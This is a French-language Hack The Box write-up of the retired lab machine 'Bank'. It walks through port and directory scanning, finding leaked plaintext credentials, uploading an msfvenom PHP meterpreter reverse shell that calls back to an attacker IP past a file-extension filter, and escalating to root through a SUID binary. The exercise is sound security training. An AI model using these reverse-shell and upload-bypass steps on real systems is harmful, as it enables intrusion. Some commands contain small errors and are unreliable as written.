---
title: Restez calme et piratez The Box - Bank
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-05-20T09:18:26.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-bank
coverImage: https://www.freecodecamp.org/news/content/images/2020/05/wallpaperflare.com_wallpaper.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Linux
  slug: linux
- name: Security
  slug: security
seo_title: Restez calme et piratez The Box - Bank
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them are simulating real world scenarios and some of them lean more towards a
  CTF style...
---

Hack The Box (HTB) est une plateforme en ligne vous permettant de tester vos compétences en tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note**. *Seuls les write-ups des machines HTB retirées sont autorisés.*

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-30-at-14.17.33.png)

Bank est une machine relativement simple, cependant une énumération web appropriée est essentielle pour trouver les données nécessaires à l'entrée.

Nous utiliserons les outils suivants pour pirater la box sur une [Kali Linux box](https://www.kali.org/) :

* nmap
* gobuster
* Searchsploit
* msfconsole
* metasploit
* meterperter
* LinEnum

Commençons.

## Étape 1 - Reconnaissance

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

## Scan des ports

J'utiliserai Nmap (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.57.03.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v bank.htb
```

**-A :** Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v :** Augmente le niveau de verbosité

**bank.htb :** nom d'hôte pour la box Bank

Si vous trouvez les résultats un peu trop écrasants, vous pouvez faire une autre commande pour obtenir uniquement les ports ouverts.

```bash
nmap bank.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.58.21.png)

Nous pouvons voir qu'il y a 3 ports ouverts :

**Port 22**, Secure Shell (SSH), connexions sécurisées, transferts de fichiers (scp, sftp) et redirection de port

**Port 53**, Domain Name System (DNS)

**Port** 80, le plus souvent utilisé par le protocole Hypertext Transfer Protocol (HTTP)

## Scan des répertoires

J'utilise Gobuster. Gobuster est un scanner de répertoires écrit en Go. Plus d'informations sur l'outil [ici](https://tools.kali.org/web-applications/gobuster). Gobuster utilise des listes de mots sur Kali qui se trouvent dans le répertoire **/usr/share/wordlists**. J'utilise des listes de mots de **dirb** et **dirbuster**, mais vous pouvez télécharger plus de listes de mots depuis **SecLists** [ici](https://github.com/danielmiessler/SecLists)

J'utilise cette commande pour la liste de mots common.txt de dirb

```bash
gobuster dir -u bank.htb -w /usr/share/wordlists/dirb/common.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.06.10.png)

Je peux voir quelques dossiers intéressants. Je fais un autre scan de répertoire avec une liste de mots différente.

```bash
gobuster dir -u bank.htb -w /usr/share/worldlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.06.18.png)



## Étape 2 - Visite de la page web

À partir de la phase de reconnaissance, je décide de commencer par le port 80. Il pointe vers une page par défaut Apache2 Ubuntu. Nous devons définir le nom d'hôte. Nous suivrons la convention standard pour les machines HTB, bank.htb

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.38.13.png)

J'ajoute bank dans le fichier /etc/hosts

```bash
nano /etc/hosts
```

avec

```bash
10.10.10.29     bank.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.55.29.png)

Je vérifie le fichier avec

```bash
cat /etc/hosts
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.39.54.png)

Lorsque je navigue vers bank.htb, je peux voir une page de connexion maintenant

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.07.14.png)

À partir de la reconnaissance gobuster, j'ai trouvé quelques dossiers. Je navigue vers **/balance-transfer**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.03.19.png)

Je regarde quelques fichiers. Tous les fichiers semblent avoir le nom complet, l'email et le mot de passe chiffrés.

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.04.41.png)

Je retourne à la page principale et je clique sur l'onglet **Size** pour trier les transferts. Je peux voir qu'un des fichiers est différent

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.03.53.png)

Lorsque je clique sur le fichier, je vois un message d'erreur en haut. Le chiffrement a échoué pour ce fichier. Je peux voir tous les détails en texte clair

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.05.14.png)

Je retourne au panneau de connexion et entre les identifiants. J'ai maintenant accès au tableau de bord de la HTB Bank. Rien d'intéressant sur cette page, alors je passe à la page **Support**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.07.43.png)

Sur la page Support, je peux télécharger des fichiers. Je vais essayer de télécharger une charge utile

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.08.21.png)

## **Étape 3 -** Utilisation de MSFvenom pour créer un exploit

Nous utiliserons MSFvenom, qui est un générateur de charge utile. Vous pouvez en savoir plus à ce sujet [ici](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.09.17.png)

Mais d'abord, voyons sur **[Metasploit Framework](https://www.metasploit.com/)** quelle charge utile nous pourrions utiliser pour créer notre exploit

Nous savons que nous devons créer un **reverse shell**, qui est un type de shell dans lequel la machine cible communique avec la machine attaquante. La machine attaquante a un port d'écoute sur lequel elle reçoit la connexion, ce qui permet d'exécuter du code ou des commandes.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.53.40.png)
_[https://resources.infosecinstitute.com/icmp-reverse-shell/](https://resources.infosecinstitute.com/icmp-reverse-shell/)_

Le reverse TCP shell devrait être pour PHP et nous utiliserons **Meterpreter**

D'après le site web d'Offensive Security, nous obtenons cette définition pour Meterpreter

> Meterpreter est une charge utile avancée, dynamiquement extensible qui utilise des injecteurs de DLL _in-memory_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket de l'injecteur et fournit une API Ruby complète côté client. Il dispose d'un historique des commandes, d'une complétion par tabulation, de canaux, et plus encore.

Vous pouvez lire plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-19-at-20.58.43.png)

Je lance **Metasploit** et recherche des charges utiles reverse TCP. J'utilise la commande suivante

```bash
search php meterpreter reverse_tcp
```

Je trouve une charge utile intéressante, numéro 594, qui est un **Reverse TCP Stager**. Cette charge utile injecte la DLL du serveur meterpreter via la charge utile Reflective Dll Injection et se connecte à l'attaquant

```bash
payload/php/meterpreter/reverse_tcp
```

Maintenant, retournons à **msfvenom** pour créer notre exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.10.36.png)

J'utilise la commande suivante

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.36 lport=443 -f raw > HTBbankshell.php
```

Je vérifie ensuite avec **ls** si le fichier a été créé

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.10.44.png)

et je regarde le contenu du fichier avec

```bash
cat HTBbankshell.php
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.11.25.png)

Je retourne à la page de support. J'ajoute le titre, le message et télécharge le fichier sur le formulaire

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.12.37.png)

Je clique sur le bouton de soumission et je vois un message d'erreur. Le type de fichier ne semble pas fonctionner

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.14.10.png)

Je vérifie le code source et je vois un commentaire qui indique que l'extension de fichier **.htb** est nécessaire pour exécuter php à des fins de débogage uniquement

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.14.42.png)

Je change ensuite l'extension de ma charge utile de **HTBbankshell.php** à **HTBbankshell.htb**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.15.42.png)

Mon fichier est maintenant prêt à être téléchargé sur la page de support

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.16.02.png)

Et cela semble fonctionner ! La charge utile a été téléchargée sur la page de support

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.16.38.png)

## **Étape 4 -** Configuration d'un écouteur avec Metasploit

De retour sur Metasploit où j'utilise la commande suivante pour définir le gestionnaire de charge utile

```bash
use exploit/multi/handler
```

Je configure d'abord la charge utile

```bash
set payload php/meterpreter/reverse_tcp
```

Ensuite le LHOST

```bash
set lhost 10.10.14.36
```

Et enfin le LPORT

```bash
set lport 4444
```

Si nous vérifions les options maintenant, nous devrions voir que tout est configuré

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.18.28.png)

Lançons l'exploit.

Après l'apparition de ce message

```bash
Started reverse TCP handler on 10.10.14.36:4444
```

retournez au navigateur et actualisez la page où le script malveillant est hébergé

```bash
bank.htb/uploads/HTBbankshell.php
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.17.09.png)

Vous devriez alors voir une session Meterpreter créée

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.19.20.png)

Je commence par recueillir quelques informations avec **getuid** qui retourne l'ID utilisateur réel du processus appelant et **sysinfo**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.19.33.png)

## **Étape 5 - Recherche du flag user.txt**

Je commence à naviguer vers root et liste les dossiers/fichiers.

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.20.44.png)

Je me déplace vers le répertoire **home** avec

```bash
cd home
```

Et je peux voir un utilisateur appelé **chris**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.20.54.png)

Je me déplace vers le répertoire **chris** et lorsque je liste les fichiers...

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.21.06.png)

Je trouve le fichier **user.txt** ! Pour lire le contenu du fichier, j'utilise la commande

```bash
cat user.txt
```

Maintenant que nous avons le flag utilisateur, trouvons le flag root !

## Étape 6 - Élévation de privilèges

J'essaie de naviguer vers le dossier root et l'accès est refusé

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.33.19.png)

J'utiliserai **LinEnum** pour énumérer plus d'informations sur cette machine. **LinEnum** est utilisé pour l'énumération locale scriptée de Linux et les vérifications d'élévation de privilèges. Plus d'informations [ici](https://github.com/rebootuser/LinEnum)

Je récupère LinEnum depuis **GitHub** avec

```bash
wget https://https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.05.png)

Je vérifie avec cette commande si le script a été correctement récupéré

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.17.png)

J'utilise la commande suivante

```bash
chmod 777 LinEnum.sh
```

pour changer les permissions du fichier et le rendre lisible, inscriptible et exécutable par tout le monde

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.34.png)

Dans meterpreter, je vérifie l'emplacement du fichier avec

```bash
lls -S "LinEnum.sh"
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.07.42.png)

Je lance un serveur php sur un autre terminal avec

```bash
php -S 10.10.14.36:4444
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.45.45.png)

Je tape la commande suivante pour obtenir un shell standard sur le système cible

```bash
shell
```

Je génère un shell TTY avec

```bash
python3 -c 'import pty;pty.spawn("/bin/bash/")'
```

Et je transfère le fichier vers la machine avec

```bash
wget http://10.10.14.36:4444/LinEnum.sh -O /tmp/LinEnum.sh
```

où je copie le fichier depuis ma boîte Kali vers le dossier temp de la machine

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.49.38.png)

Je navigue ensuite vers le dossier temp pour vérifier si le fichier a été correctement déplacé

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.17.45.png)

J'exécute ensuite le script avec

```bash
sh ./LinEnum.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.52.07.png)

Le scan me donne beaucoup d'informations. Je cherche la section **fichiers intéressants**. Je vérifie la section **fichiers SUID**. **SUID** est défini comme donnant des permissions temporaires à un utilisateur pour exécuter un programme/fichier avec les permissions du propriétaire du fichier plutôt que de l'utilisateur qui l'exécute

Je repère un fichier intéressant

```bash
/var/htb/bin/emergency
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.53.13.png)

Je navigue vers **var/htb/emergency**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.19.03.png)

Je l'exécute avec

```bash
./emergency
```

et on me demande si je veux obtenir un shell root :)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.20.07.png)

J'ai un accès root à la machine

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.20.53.png)

Je peux maintenant naviguer vers le dossier **root**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.21.31.png)

Je trouve le fichier **root.txt** !

Pour lire le contenu du fichier, j'utilise la commande

```bash
cat root.txt
```

Félicitations ! Vous avez trouvé les deux flags !

---

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

---

**Autres articles Hack The Box**

* [Restez calme et piratez The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Restez calme et piratez The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et piratez The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Restez calme et piratez The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Restez calme et piratez The Box - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
* [Restez calme et piratez The Box - Arctic](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)
* [Restez calme et piratez The Box - Grandpa](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa/)
* [Restez calme et piratez The Box - Granny](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-granny/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/wallpaperflare.com_wallpaper-1.jpg)